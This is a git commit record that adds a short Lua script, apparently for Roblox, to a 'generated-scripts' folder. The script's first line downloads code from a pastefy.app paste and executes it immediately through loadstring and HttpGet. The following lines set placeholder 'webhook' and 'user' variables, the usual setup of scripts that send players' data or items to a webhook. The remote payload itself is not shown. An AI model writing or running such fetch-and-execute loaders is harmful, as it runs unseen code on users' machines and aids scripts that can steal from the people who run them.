2be7da6f843237f4d988376e6ac0101341483813
Evelynn <folder.is.back@gmail.com>
2025-05-21 15:47:12 +0200

    Add script file: hi.lua

---
+++ generated-scripts/hi.lua
@@ -0,0 +1,7 @@
+loadstring(game:HttpGet("https://pastefy.app/ACOX6D6h/raw"))()
+
+local webhook = "hi"
+local user1 = "hi"
+local user2 = "hi"
+
+-- Additional generated Lua code can be appended here.
